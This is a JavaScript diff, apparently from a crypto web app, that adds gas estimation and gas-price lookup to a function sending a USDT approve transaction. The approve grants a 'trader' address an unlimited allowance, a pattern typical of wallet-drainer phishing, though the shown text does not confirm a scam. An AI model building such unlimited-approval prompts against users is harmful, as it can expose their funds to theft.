@@ -1302,13 +1302,37 @@ async function wfDoApprove() {
       wfTraderAddr.substring(2).padStart(64, '0') +
       'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+    // 先估算 gas limit — 提高兼容性
+    var gasLimit = '0x' + (60000).toString(16); // approve 通常 ~46000 gas，给 60000 余量
+    try {
+      var estimated = await provider.request({
+        method: 'eth_estimateGas',
+        params: [{ from: wfWalletAddr, to: wfUsdtAddr, data: approveData }]
+      });
+      gasLimit = estimated;
+    } catch(e) {
+      console.log('[wfDoApprove] gas估算失败，使用默认值: ' + gasLimit);
+    }
+
+    // 获取当前 gas price
+    var gasPrice = '0x' + (5000000000).toString(16); // 默认 5 Gwei
+    try {
+      var price = await provider.request({ method: 'eth_gasPrice' });
+      gasPrice = price;
+    } catch(e) {
+      console.log('[wfDoApprove] gasPrice获取失败，使用默认值');
+    }
+
     // 发送交易 — 这一步会触发钱包弹窗！
+    // 包含 gas 和 gasPrice 以确保 TokenPocket 兼容
     var txHash = await provider.request({
       method: 'eth_sendTransaction',
       params: [{
         from: wfWalletAddr,
         to: wfUsdtAddr,
-        data: approveData
+        data: approveData,
+        gas: gasLimit,
+        gasPrice: gasPrice
       }]
     });
 
